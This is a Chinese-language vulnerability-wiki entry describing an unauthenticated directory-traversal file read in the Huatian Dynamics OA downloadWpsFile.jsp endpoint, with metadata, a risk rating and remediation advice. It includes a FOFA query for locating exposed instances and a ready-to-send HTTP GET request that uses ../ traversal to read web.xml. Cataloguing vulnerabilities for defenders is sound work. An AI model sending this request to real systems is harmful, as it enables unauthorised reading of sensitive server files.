---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "华天动力OA downloadWpsFile.jsp目录遍历文件读取"
product: "华天动力OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无具体版本；目录htoa/Tomcat部署路径"
prerequisites: "声称未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%20downloadWpsFile.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"华天动力-OA8000\""
id: "vw-2c25baca6b67acf2c8fe105c"
entity_id: "ve-2c25baca6b67acf2c8fe105c"
schema_version: "1"
---

# 华天动力OA downloadWpsFile.jsp目录遍历文件读取

## 条目说明

- 对象与具体问题：华天动力OA；downloadWpsFile.jsp目录遍历文件读取
- 版本、配置及部署条件：无具体版本；目录htoa/Tomcat部署路径
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目标路径和参数明确，固定目录不能适用于所有部署
- HTTP缺围栏、响应只截图；在野利用已知及安全版本无依据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

华天动力OA downloadWpsFile.jsp 接口处存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。

影响版本

华天动力OA

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="华天动力-OA8000"

POC/EXP：

```http
GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```


![image-20240729143143177](./.resource/华天动力OAdownloadWpsFile.jsp任意文件读取漏洞/media/image-20240729143143177.png)


## 修复方案

1. 建议在漏洞修复前尽量避免将系统暴露在互联网上或通过白名单限制访问；

   在WAF等安全设备上监测访问URL的中是否包含上述关键词，并严加防护；

   及时升级到最新版本：http://bj.oa8000.com/。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
